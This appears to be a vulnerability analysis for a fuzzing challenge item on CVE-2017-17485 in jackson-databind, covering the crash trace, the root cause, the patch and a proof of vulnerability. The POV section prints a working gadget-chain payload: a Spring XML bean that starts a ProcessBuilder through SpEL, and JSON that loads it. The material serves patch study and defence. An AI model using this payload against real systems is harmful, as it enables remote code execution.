# Vulnerability Analysis for cpv_0

## Summary
- **CPV ID**: cpv_0
- **Harness**: JacksonDatabindOneFDP
- **Vulnerability Type**: Remote Code Execution (RCE) via Unsafe Deserialization / OS Command Injection
- **Origin**: 1-day
- **CVE**: CVE-2017-17485
- **Release Date**: 01/10/2018
- **References**: 
  - https://nvd.nist.gov/vuln/detail/CVE-2017-17485
  - https://github.com/advisories/GHSA-rfx6-vp9g-rh7v

## Crash Log Analysis
- **Error Type**: FuzzerSecurityIssueCritical: OS Command Injection
- **Detection**: Jazzer security hook detected OS command execution with attacker-controlled data
- **Vulnerable Function**: `createFromString` (StdValueInstantiator.java:326)
- **DEDUP Token**: 76c5f40ff9de70c8

### Stack Trace
The vulnerability is triggered through Jackson's polymorphic deserialization:
```
== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection
Executing OS commands with attacker-controlled data can lead to remote code execution.
	at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.processImplStartHook(OsCommandInjection.kt:60)
	at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)
	[... Spring Expression Language (SpEL) execution ...]
	at org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:134)
	[... Spring context initialization ...]
	at org.springframework.context.support.FileSystemXmlApplicationContext.<init>(FileSystemXmlApplicationContext.java:85)
	at com.fasterxml.jackson.databind.introspect.AnnotatedConstructor.call1(AnnotatedConstructor.java:129)
	at com.fasterxml.jackson.databind.deser.std.StdValueInstantiator.createFromString(StdValueInstantiator.java:326)
	at com.fasterxml.jackson.databind.deser.BeanDeserializerBase.deserializeFromString(BeanDeserializerBase.java:1353)
	at com.fasterxml.jackson.databind.deser.BeanDeserializer._deserializeOther(BeanDeserializer.java:170)
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:161)
	[... type deserializer chain ...]
	at com.fasterxml.jackson.databind.ObjectMapper.readValue(ObjectMapper.java:3079)
```

## Vulnerable Code Location(s)

### Location 1 (root_cause - Missing Type Validation)
- **Type**: root_cause
- **File Path**: src/main/java/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java
- **Function**: `createBeanDeserializer`
- **Line Range**: 130-134
- **Column Range**: 1-50

### Location 2 (crash_site - Deserialization Point)
- **Type**: crash_site
- **File Path**: src/main/java/com/fasterxml/jackson/databind/deser/std/StdValueInstantiator.java
- **Function**: `createFromString`
- **Line Range**: 320-331
- **Column Range**: 1-80

### Code Context

**Root Cause Location (BeanDeserializerFactory.java:130-134):**
```java
// Before patch - missing validation
if (!isPotentialBeanType(type.getRawClass())) {
    return null;
}
// Use generic bean introspection to build deserializer
return buildBeanDeserializer(ctxt, type, beanDesc);
```

**After Patch (lines 130-135):**
```java
if (!isPotentialBeanType(type.getRawClass())) {
    return null;
}
// For checks like [databind#1599]
_validateSubType(ctxt, type, beanDesc);  // <-- NEW VALIDATION
// Use generic bean introspection to build deserializer
return buildBeanDeserializer(ctxt, type, beanDesc);
```

**Crash Site Location (StdValueInstantiator.java:326):**
```java
public Object createFromString(DeserializationContext ctxt, String value) throws IOException
{
    if (_fromStringCreator == null) {
        return _createFromStringFallbacks(ctxt, value);
    }
    try {
        return _fromStringCreator.call1(value);  // Line 326 - triggers malicious constructor
    } catch (Throwable t) {
        return ctxt.handleInstantiationProblem(_fromStringCreator.getDeclaringClass(),
                value, rewrapCtorProblem(ctxt, t));
    }
}
```

## CWE Classification
- **CWE-502**: Deserialization of Untrusted Data (primary)
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') (consequence)
- **CWE-184**: Incomplete List of Disallowed Inputs (mechanism)

## Vulnerability Description

This is a **Remote Code Execution (RCE) vulnerability** in FasterXML jackson-databind caused by unsafe polymorphic deserialization. The vulnerability allows attackers to execute arbitrary code by sending malicious JSON that instructs Jackson to deserialize dangerous classes.

### Attack Mechanism

1. **Polymorphic Type Handling**: Jackson's default typing feature allows JSON to specify which Java class should be instantiated during deserialization using type information embedded in the JSON.

2. **Spring Framework Gadget Chain**: The attack exploits `org.springframework.context.support.FileSystemXmlApplicationContext` class:
   - Jackson deserializes this class from the malicious JSON
   - The constructor parameter specifies a path to an XML configuration file
   - Spring loads and parses the XML file (can be local or remote via file:// or http://)
   - The XML contains a malicious bean definition with Spring Expression Language (SpEL)

3. **Code Execution via SpEL**: The Spring XML configuration contains:
   - A `ProcessBuilder` bean configured with attacker-controlled command
   - A SpEL expression property that calls `pb.start()` to execute the command
   - This executes arbitrary OS commands with the application's privileges

### Root Cause

The root cause is **missing security validation** in `BeanDeserializerFactory.createBeanDeserializer()`:
- Before the patch, Jackson allowed deserialization of any class that looked like a "Bean"
- No blacklist checking was performed for dangerous classes
- Spring framework classes like `AbstractApplicationContext` (parent of `FileSystemXmlApplicationContext`) could be instantiated

### The Fix

The patch introduces a new `SubTypeValidator` class that:
1. Maintains a blacklist of dangerous classes (`DEFAULT_NO_DESER_CLASS_NAMES`)
2. Adds special handling for Spring framework classes by checking class hierarchy
3. Blocks deserialization of `AbstractApplicationContext` and `AbstractPointcutAdvisor`
4. Validates types before creating deserializers in `BeanDeserializerFactory._validateSubType()`

## POV Analysis

The POV (Proof of Vulnerability) consists of:

1. **Malicious XML File** (`/tmp/databind/exploit.xml`):
```xml
<beans xmlns="http://www.springframework.org/schema/beans" 
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
       xsi:schemaLocation="http://www.springframework.org/schema/beans 
                          http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg value="jazze" />
        <property name="whatever" value="#{ pb.start() }"/>
    </bean>
</beans>
```

2. **Malicious JSON Payload**:
```json
{
    "id": 123, 
    "obj": [
        "org.springframework.context.support.FileSystemXmlApplicationContext", 
        "//tmp/databind/exploit.xml"
    ]
}
```

The JSON uses type information (`org.springframework.context.support.FileSystemXmlApplicationContext`) to tell Jackson to instantiate this Spring class with the constructor argument pointing to the malicious XML file.

## Patch Analysis

**Patch File**: `patch_0.diff`

### Changes Made

1. **New SubTypeValidator Class** (`SubTypeValidator.java`):
   - Created comprehensive blacklist of dangerous classes
   - Added classes from multiple exploitation frameworks (commons-collections, Groovy, Spring, etc.)
   - Special logic for Spring framework classes - blocks entire class hierarchies
   - Blocks `AbstractApplicationContext` (parent of `FileSystemXmlApplicationContext`)
   - Blocks `AbstractPointcutAdvisor` 

2. **BeanDeserializerFactory Modified**:
   - Added call to `_validateSubType()` at line 133 (before building deserializer)
   - New method `_validateSubType()` calls `SubTypeValidator.validateSubType()`
   - Validation occurs **before** the deserializer is built, preventing exploitation

3. **Blacklisted Classes Include**:
   - Apache Commons Collections transformers
   - Groovy closures
   - Spring framework beans: `ObjectFactory`, `PropertyPathFactoryBean`, `AbstractApplicationContext`
   - C3P0 and Tomcat DBCP data sources
   - JDK classes: `FileHandler`, `UnicastRemoteObject`
   - And others

### Why the Patch Works

- **Proactive Validation**: Checks types before deserialization, not during or after
- **Hierarchical Checking**: For Spring classes, walks up the class hierarchy to catch all `AbstractApplicationContext` subclasses
- **Defense in Depth**: Blacklists multiple gadget chains, not just one specific class

## Recommendations

### Suggested CWEs
- CWE-502: Deserialization of Untrusted Data
- CWE-78: OS Command Injection
- CWE-184: Incomplete List of Disallowed Inputs

### Vulnerability Name
"Jackson-databind Unsafe Deserialization via Spring Framework Gadget (CVE-2017-17485)"

### Additional Notes

- **Severity**: Critical (CVSS 9.8)
- **Related CVEs**: This is an incomplete fix follow-up to CVE-2017-7525
- **Attack Prerequisites**: 
  - Spring Framework must be in classpath
  - Jackson's polymorphic type handling must be enabled (default typing)
- **Exploitation**: Demonstrated in the wild; multiple public exploits exist
- **Impact**: Complete system compromise - arbitrary code execution with application privileges